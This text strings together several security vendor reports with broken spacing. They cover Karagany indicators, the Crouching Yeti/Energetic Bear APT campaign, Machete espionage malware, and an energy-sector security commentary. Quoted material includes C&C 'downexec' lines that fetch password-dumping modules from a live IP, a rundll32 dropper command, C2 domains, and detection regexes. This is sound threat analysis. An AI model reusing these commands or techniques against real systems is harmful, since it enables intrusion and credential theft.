identifiant=51032 _ 1799883375637 & version = i2pver HTTP response example HTTP/1.1 200 OK Date : Tue , 28 Jan 2014 05:59:58 GMT Vary : Accept - Encoding Content - Length : 324 Content - Type : text / html X - Powered - By : PHP/5.3.10 - 1ubuntu3.9 Via : 1.1 host.alexsieff.com work:3|downexec [ http : // ] 93.188.161.235/check2/muees27jxt/shot.jpg ; work:5|downexec [ http : // ] 93.188.161.235/check2/muees27jxt/tl.jpg ; work:7|downexec [ http : // ] 93.188.161.235/check2/muees27jxt/fl.jpg ; work:103|downexec [ http : // ] 93.188.161.235/check2/muees27jxt/pdump.jpg ; work:118|downexec [ http : // ] 93.188.161.235/check2/muees27jxt/fl.jpg ; The POST data contains the operating system version and a derived number : • identifiant= [ OS VERSION ] _ [ DERIVED NUMBER ] User - Agent tokens used in C & C requests are hard - coded .
The following two examples have been observed : • Mozilla/17.0 ( compatible ; MSIE 8.0 ; Windows NT 6.1 ; .NET
CLR 2.0.50727 ; .NET
CLR 3.5.30729 ) • Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET
CLR 2.0.50727 ; .NET
CLR 3.5.30729 ) • pdump.jpg - Used for dumping passwords into \ProgramData\Mail\MailAg\pwds.txt .
Needs ' vaultcli.dll ' library • fl.txt - Used for listing RTF , PST , DOC , XLS , PDF , * pass * .
* , * secret * .
* files into \ProgramData\Mail\MailAg\fls.txt • tl.jpg - Used to list running task using ' tasklist ' utility • shot.jpg - Used for desktop screenshot , file is saved into \ProgramData\Mail\MailAg\shot.png Regular expression for URL or HTTP request - line searches : • [ ^= ] * = ( dw [ de ] |fn [ de ] ) $ • \.php\ ? id= [ 0 - 9A - F ] { 28 } .
{ 0,5 } & v1= [ 0 - 9 ] { 1,5 } & v2= [ 0 - 9 ] { 1,10 } & q= [ 0 - 9A - F ] { 20 } Regular expression for file system searches : • ( TMPprovider [ 0 - 9 ] { 3 } \.dll|sy [ ds ] main\.dll ) • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ '' TmProvider '' • HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ '' TmProvider '' • 91.203.6.71 • 93.171.216.118 • 93.188.161.235 • identifiant= [ OS VERSION ] _ [ DERIVED NUMBER ] • filename= [ FILE NAME ] & identifiant= [ INFO DERIVED FROM OS ] & fichier= [ ENCODED DATA FROM FILE ] Karagany Yara rule : Symantec Security Response ﻿﻿ Symantec protects the world 's information and is the global leader in security , backup , and availability solutions .
Our innovative products and services protect people and information in any environment - from the smallest mobile device to the enterprise data center to cloud - based systems .
Our industry - leading expertise in protecting data , identities , and interactions gives our customers confidence in a connected world .
More information is available at www.symantec.com or by connecting with Symantec at go.symantec.com/socialmedia .
Headquartered in Mountain View , Calif. , Symantec has operations in 40 countries .
More information is available at www.symantec.com .
For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters 350 Ellis St. Mountain View , CA 94043 USA + 1 ( 650 ) 527 - 8000 1 ( 800 ) 721 - 3934 www.symantec.com Copyright © 2014 Symantec Corporation .
All rights reserved .
Symantec , the Symantec Logo , and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries .
Other names may be trademarks of their respective owners .
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .
NO WARRANTY .
The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .
Any use of the technical documentation or the information contained herein is at the risk of the user .
Documentation may include technical or other inaccuracies or typographical errors .
Symantec reserves the right to make changes without prior notice .
Energetic Bear / Crouching Yeti is an actor involved in several advanced persistent threat ( APT ) campaigns that have been active going back to at least the end of 2010 .
Targeted sectors include : • Industrial / machinery • Manufacturing • Pharmaceutical • Construction • Education • Information technology Most of the victims we identified fall into the industrial / machinery building sector , indicating this is of special interest .
To infect the victims , the attackers rely on three methods : • Spearphishing using PDF documents embedded with a flash exploit ( CVE-2011 - 0611 ) • Trojanized software installers • Waterhole attacks using a variety of re - used exploits During the attacks , the Crouching Yeti uses several malware / Trojans , which exclusively infect Windows systems : • Havex Trojan • Sysmain Trojan • The ClientX backdoor • Karagany backdoor and related stealers • Lateral movement and second stage tools For command and control , these connect to a large network of hacked websites .
These sites host malware modules , victim information and issue commands to infected systems .
The dozens of known Yeti exploit sites and their referrer sites were legitimate , compromised sites .
They ran vulnerable content management systems or vulnerable web applications .
None of the exploits used to compromise the servers were known to be zero - day .
None of the client side exploits re - used from the open source metasploit framework were zero - day .
Overall , we observed about 2,800 victims worldwide , the most prevalent attack tool being the Havex Trojan .
We believe this group is highly determined and focused on a very specific industrial sector of vital interest .
It uses a variety of ways to infect its victims and exfiltrate strategic information .
The analyzed data seems to suggest the following points : ● It is not currently possible to determine the Country of origin The attackers ' global focus is much broader than power producers ● Their toolset has remained stable over time ● Managed , minimal , methodical approach to sustained operation ● Appropriate use of encryption ( symmetric key protected with attackers public key for encrypted log file exfiltration ) This report provides technical details on how they perform their operations .
This section analyzes all the aspects we could find about how this actor performs its campaigns .
The Crouching Yeti actor performed a massive surveillance operation targeting strategic victims , many of them in the industrial / manufacturing sector .
There were different ways of delivering of its malware including waterholing , spearphishing and adding malware to legitimate installers .
Once the victims were infected , Crouching Yeti selected different RATs for its operations .
These RATs communicated with Command and Control servers on compromised servers around the world , using a simple PHP backend .
We were able to identify several victims , including high - profile ones and dozens of domains used in the campaign .
As far as we know the group behind Crouching Yeti delivers its malware using at least three different methods .
The first method uses a legitimate software installer repackaged to contain the malicious DLL .
Such modified self - extracting archives could have been uploaded directly to a compromised server , replacing the original file , or sent to the victim by email .
One example of this method was a hijacked SwissRanger camera driver ( libMesaSR version 1.0.14.706 ) that was used to drop the Sysmain backdoor to : % APPDATA % \sydmain.dll and set the Run registry value to load malicious DLL upon next system startup .
In a similar manner , as early as January 2014 , Havex version 038 appears to have been dropped by a legitimate ~40 MB software installer from the eWon web site : hxxp : //www.ewon.biz / software / eCatcher / eCatcherSetup.exe '' eWon '' is a Belgian producer of SCADA and industrial network equipment , which helps define this attack method as a watering hole attack : '' Breaking the barrier between industrial applications and IT standards , the mission of eWON is to connect industrial machines securely to the Internet , enabling easy remote access and gathering all types of technical data originating from industrial machines ...
Connecting machines across the Internet is our mission .
'' Sometimes , the Havex loader was dropped from `` eCatcherSetup_v4.exe '' , so it seems that the site operators may have removed a previous file and the attackers replaced it with their trojanized installer , and so on .
Likely , the attackers gained access to eWon 's ftp site and replaced the legitimate file with one that is bound with the Havex dropper several times .
Another example that involves a hijacked application from a PLC - related vendor is a Trojanized mbCHECK installer which replaced the original legitimate version freely downloadable from the vendor 's website .
The legitimate version can be downloaded for free from the vendor 's website .
The vendor - MB Connect Line - is a company which specializes in software for remote maintenance of PLC systems : MB Connect Line GmbH ( hxxp : //www.mbconnectline.com / index.php / en/ ) .
In this case , the dropped DLL was Havex version 043 .
The second method relies on a malicious XDP file containing the PDF / SWF exploit ( CVE-2011- 0611 ) and was most probably used in spear - phishing attacks .
This exploit drops the Havex loader DLL , which is stored in an encrypted form in the XDP file .
The exploit is delivered as an XDP file ( XML Data Package ) which is actually a PDF file packaged within an XML container .
This is a known the PDF obfuscation method and serves as an additional anti - detection layer .
The XDP file contains an SWF exploit and two files ( encrypted with XOR ) stored in the invalid section of the PDF .
One of the files is Havex DLL ( version 038 ) , the other is a small JAR file which is used to copy and run the DLL by executing the following command : cmd /c copy < fname_passed_as_param > % TEMP % \\explore.dll /y & rundll32.exe % TEMP % \\explore.dll , RunDllEntry SWF executes the action script , which contains another SWF file which in turn uses the CVE- 2011 - 0611 vulnerability to run the shellcode .
The shellcode then looks for a specific signature in the memory ( which signs the start of encrypted DLL ) , decrypts and loads it .
Finally , this actor actively compromises legitimate websites for watering hole attacks .
These hacked websites in turn redirect to malicious JAR or html files hosted on other sites maintained by the group ( exploiting CVE-2013 - 2465 , CVE-2013 - 1347 , and CVE-2012 - 1723 in Java 6 , Java 7 , IE 7 and IE 8 ) , which then drop the Havex loader , the Karagany backdoor and helper tools .
These sites run an exploit kit known as `` LightsOut '' .
It appears that the `` LightsOut '' exploit kit is exclusively used by Energetic Bear / Crouching Yeti .
From the dozens of Yeti exploit sites we reviewed , the malicious code was nothing more than slightly modified metasploit java exploits delivering the Havex loader .
Some sort of internal review must have pushed them towards the LightsOut EK .
KSN data records help provide a list of Crouching Yeti related exploit delivery from dozens of these sites .
In earlier cases ( July 2013 ) , successful Java exploitation served from nahoonservices.com would cascade into more Yeti components planted on victim systems .
The java exploit downloaded Karagany backdoors , which in turn downloaded stealers from 91.203.6.71 : Ksn data recorded at least 20 victim sites that were compromised and injected with Yeti iframes , redirecting hundreds of visitors to compromised Yeti exploit sites .
Most of these redirector sites were owned by western and Eastern European power players , investors , legal advisors and advocates , and European and US industrial IT equipment makers .
The compromised sites hosting the LightsOut Exploit Kit were fairly trafficked , legitimate sites .
Their content varies widely , from California winemakers to Cuban travel agencies and Iranian general interest / religious inspiration sites .
Finally , other second stage tools were simply retrieved by the downloaders over http from various servers .
Some of these Yeti sites , like kinoporno.org , served both Havex and these tools .
KSN events recorded the sites serving Windows Credential Editor and custom credential and document stealing tools .
The Crouching Yeti group has different tools of choice for their operations .
This section describes them from a technical perspective .
The main functionality of this component is to download and load additional DLL modules into the memory .
These are stored on compromised websites that act as C & C servers .
In order to do that , the malware injects itself into the EXPLORER.EXE process , sends a GET / POST request to the PHP script on the compromised website , then reads the HTML document returned by the script , looking for a base64 encrypted data between the two `` havex '' strings in the comment tag < ! -- havexhavex -- > and writes this data it to a % TEMP % \ < tmp > .xmd
file ( filename is generated by GetTempFilename function ) .
In the meantime , another routine is constantly checking the % TEMP % folder for all * .xmd files .
For each file it finds , it decompresses the content , decrypts ( if encrypted ) and loads into the memory as the DLL .
In order to run on each system boot , malware copies itself to : < path > \TMPprovider0XX.dll and creates the autorun registry key .
All samples of this component contain a statically linked bzip2 library .
Versions > = 01B also contain an RSAeuro library , used to encrypt log files and decrypt downloadable modules .
Public keys for encryption are hardcoded in the binary and/or stored in the configuration section .
In some cases , these keys are written to the registry values .
In total , we identified 124 different samples of Havex loaders , belonging to 27 different versions .
As of June 2014 , the latest version number we have is 044 .
The URL addresses of the C & C servers ( which are indeed compromised websites ) are either hardcoded in the binary , or - in versions = > 038 - specified in the configuration section inside the ICT resource .
This resource is compressed with bzip2 and encrypted with XOR .
There are usually 2 - 4 URLs per binary , different for each malware version and sometimes also different between samples of the same version .
Malware sends a GET request ( versions < 017 ) or POST request to the first available URL .
The request contents depends on the malware version and it may include such information as unique bot i d , malware version number , OS version number , and some other data from configuration , as well as the harvested information logged into the * .yls file ( if any ) .
Then the malware searches the HTML code of each returned page for havex markers and saves the data between the markers into a temporary file .
These modules are hosted between the havex markers in the HTML code of compromised websites .
The module code is usually XORed with `` 1312312 '' then compressed with BZIP2 and finally base64 encoded .
Once downloaded into the % TEMP % \*.xmd file by the main Havex DLL , the code is decoded , decompressed , saved into the temporary DLL file and loaded into the memory .
The modules perform a variety of different actions , including collecting information about the victim 's system and other machines in the local network , harvesting passwords , listing documents , etc .
In order to do that , some of the modules make use of additional 3rd stage 3rd party executables .
Each module contains configuration information stored in an encrypted and compressed form inside a resource .
Configuration data includes 29-byte UID ( unique ID ) , a 1024-bit RSA Public key ( base64 encoded ) and other necessary info ( like file paths , etc . ) .
All harvested data is compressed , encrypted and written into the % TEMP % \*.yls files , which are then sent to the C & C by the main Havex / Sysmain module .
The `` yls '' files are encrypted with the 3DES crypto algorithm using a random 192-bit key ( 168 bit effective ) .
The 3DES key is encrypted using the public RSA 1024 key and therefore never transferred in plain text to attackers .
In - depth analysis of the cryptography used by log files is presented in Appendix 2 This module is designed to collect detailed data about the OPC servers running in the local network and save them to a % TEMP % \ { rand } .yls
file .
To query the OPC servers , it uses the following interfaces : ● IID_IOPCEnumGUID ● IID_IOPCServerList ● IID_IOPCServerList2 ● IID_IOPCServer ● IID_IOPCBrowsr ● IID_IOPCBrowseServerAddressSpace ● IID_IOPCItemProperties ● CATID_OPCDAServer10 ● CATID_OPCDAServer20 ● CATID_OPCDAServer30 This module collects basic information about the system it 's running on , and saves it to the % TEMP % \ { rand } .yls
file .
Harvested data includes : ● Unique system ID ● OS version ● Username ● Computer name ● Country ● Language ● Current IP ● List of drives ● Default Browser ● Running Processes ● Proxy Setting ● User Agent ● Email Name ● BIOS version and date ● Lists of files and folders ( non - recursive ) from Desktop , My Documents and Program Files folders and root directories on all drives .
This module collects contact details stored in all outlook.nk2 files and writes them to the % TEMP % \ { rand } .yls
file .
Outlook.nk2 is the file where Outlook ( version since 2007 ) keeps contact details in order to use them with the AutoComplete feature .
This module uses the embedded BrowserPasswordDecryptor 2.0 tool ( hxxp : //securityxploded.com / browser - password - decryptor.php ) to dump login credentials stored by the password managers of various browsers .
Decrypted passwords are saved into the % TEMP % \~tmp1237.txt file , which is then copied by the parent module into an encrypted * .tmp.yls file .
List of browsers supported by the tool ( from the product 's website ) : ● Firefox ● Internet Explorer ● Google Chrome ● Google Chrome Canary / SXS ● CoolNovo Browser ● Opera Browser ● Apple Safari ● Comodo Dragon Browser ● SeaMonkey Browser ● SRWare Iron Browser ● Flock Browser This module is designed to scan the local network and look for all hosts listening on ports related to OPC / SCADA software .
Information about these hosts is then saved to the % TEMP % \~tracedscn.yls file .
In - depth analysis of the Havex loader and its related modules is presented in Appendix 2 .
This component is a simple downloader with a functionality similar to the Havex component .
It sends requests to the PHP script at the C & C ( compromised website ) and looks for specific data in the returned HTML code .
It writes the data ( some ASCII strings ) from between < I6 > < /I6 > tags to the file in % TEMP % \Low\~task.tmp and the data ( binary data XORed with 0x0A ) from between < B6 > < /B6 > tags into the % TEMP % \Low\~ldXXXX.TMP file .
Then it decrypts the ldXXXX.TMP file and loads it into memory .
Based on the compilation times , we may assume that this loader was used to download and run modules before it was replaced by Havex .
The Ddex loader is analyzed in more detail in Appendix 4 .
This malware can be described as a classical RAT ( Remote Access Trojan ) , since it gives the attacker a wide range of opportunities to control and interact with the victim machine .
The autonomous part of Sysmain installs and registers itself to be persistent in the system .
Then it gathers general information about the victim system , like ● User- and computer names ● Locale information ● Network- and drive status ● Default browsers ● Running processes ● File listing from the user profile directory .
When ready , this data is submitted to one of the C & C - servers .
After that , it checks periodically for new commands from C & C ( pulling via HTTP ) .
With a set of 11 commands , the malware is able to : ● Execute shell - commands ● Launch additional executables or libraries ( sent by the attacker ) ● Collect arbitrary files for later exfiltration ● Examine the victim 's file system .
There are also commands used for maintenance purposes .
Among others , there are commands to change the pubkey for C & C - communication or delete its traces in the registry .
It receives its commands from one of four static command - and - control servers .
Every variant of this malware has its own set of servers .
As usual , the attackers are using webservers - most likely compromised ones - as part of their C & C - infrastructure .
To communicate with the C & C - server , the Trojan makes use of asymmetric encryption with a hardcoded pair of private and public keys .
Another public key is used to encrypt files , which are collected in a local dropzone on the victim 's file system .
The files in that dropzone will be submitted to the attacker later , all in one go .
Appendix 3 provides in - depth analysis of the Sysmain backdoor .
This component is written in .NET
and is very similar to The Sysmain backdoor .
The settings of the RAT are stored in the registry as BASE64 encoded values .
The RAT gets its commands by sending a request to a PHP script on the C & C ( compromised server ) as usual , and looks for specific data in the returned HTML code .
The data in this case is stored between the havexhavex tags , it is then decrypted and decoded ( base64 ) .
The RAT supports 13 commands including : · Screen capture · Trojan Update · Loading DLLs · Starting executables · Running shell commands · Listing directories Each time a command ( task ) is executed , the result of that command is stored in the registry under a subkey named `` done '' or `` doneEXT '' .
The results ( which are called `` answers '' by the authors ) are then POSTED to the C & C server .
The ClientX backdoor is analyzed in depth in Appendix 5 .
Karagany is a simple backdoor that connects to the C & C and keeps waiting for commands .
It can download and run additional executables , load / delete modules , read file content , reboot the computer , update itself and remove all components .
Besides backdoor functionality , it also extracts credentials from Internet Explorer 's password manager to the prx.jpg file and injects a small DLL into the processes of web browsers .
This DLL keeps listening to outgoing network traffic and looking for basic access authentication details sent over unencrypted HTTP .
Affected browsers include Internet Explorer , Firefox , Mozilla and Opera .
When executed , it copies itself to the folder under % APPDATA % and creates a .lnk
file in the % STARTUP % directory .
The folder name and filename are chosen from a list of strings hardcoded in the binary : It also creates the C : \ProgramData\Mail\MailAg\ folder , where the information harvested by downloaded modules will be stored .
After checking if a connection to the Internet is up , it sends an initial POST request to the C & C server .
Known parameters used in C & C communication are : ● & identifiant= < victim_uid > , which is calculated based on system version , system install date , username and system metrics ● & version= < bot_version_nr > ● & fichier= < file_content > This module is used to drop and run the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application for capturing screenshots ( hxxp : //www.ducklink.com/ ) .
A screenshot of the desktop is saved into the C : \ProgramData\Mail\MailAg\scs.jpg file .
Additionally , other system information - such as the date and time of capture , computer name , username , cpu architecture , os version , IP address , logon domain and logon server , desktop details ( height , width , depth , refresh rate ) and environmental variables - are logged in C : \ProgramData\Mail\MailAg\scs.txt file .
This module is used to list all files and documents with specified extensions , or which have names containing specified strings in the C : \ProgramData\Mail\MailAg\fls.txt file .
Saved information includes path , size and modification time .
File matching patterns : The Command and Control Servers are compromised legitimate websites , like Blogs , from different countries .
In total we have identified 219 unique domain names for these C & C servers hosted in 21 different countries .
We found most hosted C & Cs in the United States ( 81 servers ) , Germany ( 33 servers ) , the Russian Federation ( 19 servers ) and the United Kingdom ( 7 servers ) .
The table below shows the distribution of victims affected by the samples identified according to our KSN data .
Victims infected with samples from any of the Crouching Yeti group 's malware were found in : 65 of these C & C servers , in the following countries , were monitored during our investigation .
This monitoring enabled us to get a list of the victims connected to them .
The C & C Backend is written in PHP , consisting of 3 files : • `` log.php '' is a Web - Shell , used for file level operations .
• `` testlog.php '' is not a PHP - script but it contains the C & C Server logfile of Backdoor- connections .
Please see `` source.php '' below for further information .
• `` source.php '' The Backdoors interact with `` source.php '' , which is the control script .
These are its functions on execution : 1 .
Collect the following information : 2 .
Write the above information to `` testlog.php '' , separated by `` Tabulator '' and base64- encoded , with the following syntax : < timestamp > \t < victim ip - address > \t < proxy > \t < botID > \t < request - uri > \t < useragent > 3 .
Write all transferred HTTP - GET Variables to `` < botID > .log
'' , separated by `` Tabulator '' and base64-encoded .
4 .
If the bot executes an HTTP - POST - request , the transferred data is written to the file `` < botID > .ans
'' , enclosed in `` xdata '' -Tag with timestamp .
( `` ans '' is the acronym for `` Answer '' ) .
5 .
Check for any `` < botID > _ * .txt '' files a .
If found the first step is to append the timestamp , filename and a `` sent '' Status indicated to `` < botID > .log
'' .
Then the file content is transferred to the bot , embedded into HTML with the HTML - Body `` No data ! '' and the HTML - Comment `` havex '' , which contains the data to be transferred .
Finally the file on the server is removed .
If this removal fails it is logged to `` < botID > .log
'' .
b .
If no matching file is found , an HTML - Response is sent with an empty `` havex '' HTML - Comment and HTML - Body text `` Sorry , no data corresponding to your request .
'' The term `` victim '' in this section refers to a botID ( unique String of the Backdoor ) , connecting to one or more C & C Servers .
Based on the 45 C & C Servers wemonitored , a total of 2,811 unique Victims were discovered .
The average number of victims per C & C is 70 : The following chart depicts the first ( red line ) and last ( blue line ) appearance of each victim on the C & C .
The `` FirstHit '' shows how the rate of accumulating new victims has accelerated over the course of 2014 .
`` LastHit '' shows how the last connection of victims to C & C servers also increases over time .
This could mean victims are disinfecting their computers , or it may be that they simply report to a different C & C server that we do not monitor .
Mapping the unique hits of victims per day also indicates a decrease of `` active '' infections .
The following chart clearly shows a difference between weekdays ( groups of five higher bars ) and weekends ( two lower bars ) .
The daily unique hit - rate fell by about half from around 800 connections at the beginning of 2014 to around 400 connections per week - day by the middle of the year : More than half of the victims always connect from the same IP address .
Fewer than half of the victims connect from two or more different IP addresses as the following graph shows .
This might indicate that some of the victims are behind proxies , which makes sense for corporate environments .
Victims using many different IP addresses may indicate laptops .
The following chart visualizes all the unique victims connecting to C & C servers .
The main C & C Servers can be clearly seen in Russia and the USA .
The victims are distributed across 99 different countries .
From the total of 2,811 victims , it was possible to accurately identify 106 of them .
Appendix 8 contains a brief description about the sector / company in which these victims operate .
The table below summarizes the distribution of the identified victims by sector .
Based on our monitoring , the most widespread Backdoor is Havex with a total of 2,470 infected systems , mostly based in USA and Spain : 32 different versions of Havex are used among all victims , with 51 victims left without any identifiable Havex version .
Havex Version 024 , compiled at the end of 2012 , is the most widespread .
Besides the Havex version , the OS Version of the victim computer is also communicated to the C & C server .
The most common Operating System among victims is Windows XP , but Windows 8.1 is also on the list .
The Sysmain victims connect to six of the monitored C & C servers , where 261 unique victims were counted , located in 38 different countries .
Victims of the Clientx backdoor connect to 2 of the monitored C & C Servers , where 10 unique Victims were counted in 5 different countries .
Based on the analysis of the monitored C & C Servers we can identify some clusters based on malware versions and the victims .
This graph visualizes these relations .
Every dot represents a victim , different Backdoors and versions are colored differently .
The C & C Servers are also represented as dots where several clients connect .
Grey lines are connections from a victim to its C & C Server .
Some C & C Servers are dedicated to a given version of a backdoor ( big Cluster ) .
Others share connections with different backdoor versions and different backdoors .
Breaking this down to the sectors of the identified victims , we can not see any correlation between C & Cs and victims .
The same sectors are targeted with different backdoor versions .
Compared to our other APT research the available data is more non - specific than usual .
There simply is no one piece or set of data that would lead to the conclusion that the threat actor is Bear , Kitten , Panda , Salmon , or otherwise .
Significant data points below .
It is rare to see file timestamps used as a precise , primary source of information when it comes to threat actor attribution .
In previous reports , these timestamps have been used as supporting , or secondary pieces of data .
They may help to suggest or support a time range for attacker activity , but they are very easily modified .
So it is not very helpful to focus on this data set .
The strings present in the backdoors , web components , and exploits are in English .
Almost 200 malicious binaries and the related operational content all present a complete lack of Cyrillic content , the opposite of our documented findings from researching Red October , Miniduke , Cosmicduke , Snake , and TeamSpy .
The OPC module strings include typos and bad grammar .
Some are so bad they are almost silly and there does n't seem to be a consistent pattern here : Programm was started at % 02i : % 02i : % 02i Start finging of LAN hosts ...
Finding was fault .
Unexpective error Was found % i hosts in LAN : Hosts was't found .
There are also three interesting strings inside the Karagany backdoor : identifiant ( which is French for identifier ) , fichier ( French for file ) and liteliteliteskot ( lite scot is Swedish for little sheet ) Timestamp analysis is based on a total of 154 collected binaries : ● 124 Havex loader samples ( versions 01 - 044 ) + 7 downloaded modules ● 7 Sysmain backdoor samples ● 4 Ddex loader samples ● 1 ClientX backdoor sample ● 4 Karagany Trojan samples + 2 downloaded modules ● 3 samples of Trojanized installers Highlights : ● The earliest samples related to this campaign are the Ddex loader binaries with compilation timestamps between October and November 2010 .
● The first Havex loader samples , version 01 and version 02 , have compilation timestamps from 28th September 2011 .
● The latest known samples are Havex loader version 044 , compiled on 7th May 2014 , and all OPC modules compiled in April and May 2014 .
● Most samples were compiled on weekdays , although there are a couple of samples with the compilation timestamp from a Saturday .
● Most samples were compiled between 6:00 and 16:00 UTC with a peak between 6:00 and 8:00 UTC .
○ Earliest compilation time : 02:15:23 UTC ( We d , 28 Sep 2011 ) ○ Latest time : 23:39:34 UTC ( Thu , 02 Jun 2011 ) Activity / Year ( all samples ) : Activity / Weekdays based on compilation time : Activity / Hours ( UTC ) based on compilation time : All the exploit servers delivered slightly modified ripped content from open source repositories .
All the servers appear to be hacked servers .
According to the available data , no zero - day exploits were used in any of these attacks , either to compromise the servers in the first place , or delivered as client side attack exploits by the Lights Out Exploit Kit .
While this purely malicious re - use of metasploit PoC highlights the danger that these attack tools pose , it is also unusual to see an exclusively metasploit attack toolset effectively used in this way , delivered from what appear to be a chain of higher value compromised sites .
All of these compromised web applications were vulnerable to freely available offensive security tools .
We acknowledge that many of the compromised referrer servers were related to power producers in some way .
However , these targets almost seem an afterthought , as the exploit servers themselves were compromised web servers from Cuban travel agency sites , a Californian winery site , a US based women 's fashion site , an Iranian general interest / religious inspiration site , a number of dating and adult content websites , and a variety of others .
Although , we note that the known Trojanized software packages were ICS / SCADA related as well , possibly because those victim sets or environments required special attention .
So , while there was a strong set of offensive activities on power producers during the campaigns , it was by no means the full focus of them .
While it may be `` shocking '' to observe power producers around the world targeted by any one threat actor , this actor 's attack activity does not appear to be constrained to power producers .
The related industries of interest show a much broader global scope than previously discussed , and the geographic regions of interest have gone completely undiscussed .
For example , Spain had the highest number of victims .
However , it appears that there was no significant correlation between the victim location and the C & C geolocation .
And , according to our data , the list also includes victim organizations fitting the following additional categories : • Pharmaceuticals • Health • Cleaning • Education • Automotive • Transportation • Packaging • Network Infrastructure • Information Technology • Structural Engineering • Mechanical Engineering The Crouching Yeti actor has been performing massive surveillance campaigns in recent years , since at least 2010 .
Their targets included thousands of victims of which we were able to identify a few , confirming Crouching Yeti 's interest in several strategic sectors .
The distribution strategy of the group focuses on methods following this targeted philosophy , including spear phishing and waterholing .
Noticeably , they also compromised legitimate software packages from strategic actors in the SCADA sector in order to infect their final victims .
The victim list confirms that the tactic proved successful .
There is nothing especially sophisticated in their exploits , or in the malware they used to infect victims .
Their RATs are flexible enough to perform surveillance and data exfiltration efficiently .
They used dozens of compromised servers as Command and Control domains with a simple , but effective , PHP backend .
However there is an interesting connection with this group and the LightsOut Exploit Kit for the distribution of its malware in some waterholing attacks .
We believe they are likely its only operators as of June 2014 .
Thanks to the monitoring of several of the Command and Control domains used by the group , we were able to identify several victims .
This victims ' list reinforces the interests shown by the Crouching Yeti actor in strategic targets , but also shows the interest of the group in many other not - so - obvious institutions .
We believe they might be collateral victims , but it might also be fair to redefine the Crouching Yeti actor not only as a highly targeted one in a very specific area of interest , but a broad surveillance campaign with interests in different sectors .
We will continue monitoring this actor .
Some time ago , a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown , undetected malware .
While assisting the customer , we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces .
At first look , it pretends to be a Java related application but after a quick analysis , it was obvious this was something more than just a simple Java file .
It was a targeted attack we are calling '' Machete '' .
`` Machete '' is a targeted attack campaign with Spanish speaking roots .
We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 .
The operation may be still `` active '' .
The malware is capable of the following cyber - espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .
In some cases , such as Russia , the target appears to be an embassy from one of the countries of this list .
Targets include high - level profiles , including intelligence services , military , embassies and government institutions .
The malware is distributed via social engineering techniques , which includes spear - phishing emails and infections via Web by a fake Blog website .
We have found no evidence of of exploits targeting zero - day vulnerabilities .
Both the attackers and the victims appear to be Spanish - speaking .
During this investigation , we also discovered many other the files installing this cyber - espionage tool in what appears to be a dedicated a spear phishing campaign .
These files display a PowerPoint presentation that installs the malware on the target system once the file is opened .
These are the names of the PowerPoint attachments : Hermosa XXX.pps.rar Suntzu.rar El arte de la guerra.rar Hot brazilian XXX.rar These files are in reality Nullsoft Installer self - extracting archives and have compilation dates going back to 2008 .
A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation .
The result is extremely large files , over 3 MB .
Here are some screnshots of the mentioned files : A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware .
This is very unusual and does not have any advantage for the attackers except ease of coding .
There is no multi - platform support as the code is heavily Windows - oriented ( use of libraries ) .
However , we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well .
In addition to Windows components , we also found a mobile ( Android ) component .
Both attackers and victims speak Spanish natively , as we see it consistently in the source code of the client side and in the Python code .
The following code snippets were found into the HTML of websites used to infect victims : Note : Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from SET , The Social Engineering Toolkit .
Also the following link to one known infection artifact : hxxp : //name.domain.org / nickname / set / Signed_Update.jar The following are domains found during the infection campaign .
Any communication with them must be considered extremely suspicious java.serveblog.net agaliarept.com frejabe.com grannegral.com plushbr.com xmailliwx.com blogwhereyou.com ( sinkholed by Kaspersky Lab ) grannegral.com ( sinkholed by Kaspersky Lab ) Creates the file Java Update.lnk pointing to appdata / Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .
The victims are all Spanish speaking according to the filenames of the stolen documents .
The language is also Spanish for the operators of the campaign , we can find all the server side code written in this language : reportes , ingresar , peso , etc .
The `` Machete '' discovery shows there are many regional players in the world of targeted attacks .
Unfortunately , such attacks became a part of the cyber arsenal of many nations located over the world .
We can be sure there are other parallel targeted attacks running now in Latin America and other regions .
Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan- Spy . Python . Ragua .
Note : A full analysis of the Machete attacks is available to the Kaspersky Intelligent Services customers .
Companies now not only face cyber attacks from hacking groups , script kiddies and hactivists , they are also threatened by state - sponsored agencies with limitless resources .
These agencies usually carry out cyber attacks to seek a competitive edge , gain access to intellectual property , or for sheer sabotage .
In other words , cyber threats have never been more pervasive and attack damages never more real .
The situation is especially grim for the Energy and Natural Resources ( ENR ) industry .
The sector is plagued by two key problems .
For one , top management has traditionally not placed sufficient emphasis on information security .
Also , much more focus is placed on connectivity compared to security .
As a result , the ENR sector has become an enticing and relatively easy target for cyber attacks .
As evidenced in recent cyber incidents `` Shamoon '' and `` Night Dragon '' , the resultant loss and combined damage , be it substantial or intellectual , would be far greater than the cost of preventive security measures .
In this increasingly insecure environment , senior management should refresh their perspective to safeguard their key corporate assets .
For many organisations in the Asia Pacific , a cyber security - oriented structural transformation might be necessary .
`` I am convinced that there are only two types of companies : those that have been hacked and those that will be .
And even they are converging into one category : companies that have been hacked and will be hacked again .
'' Robert S. Mueller , FBI Director RSA Cyber Security Conference March 2012 Cyber threats and IT risks are omnipresent .
Compared to the past when criminals used a scattergun approach , cyber attacks now are much more focused and intelligent .
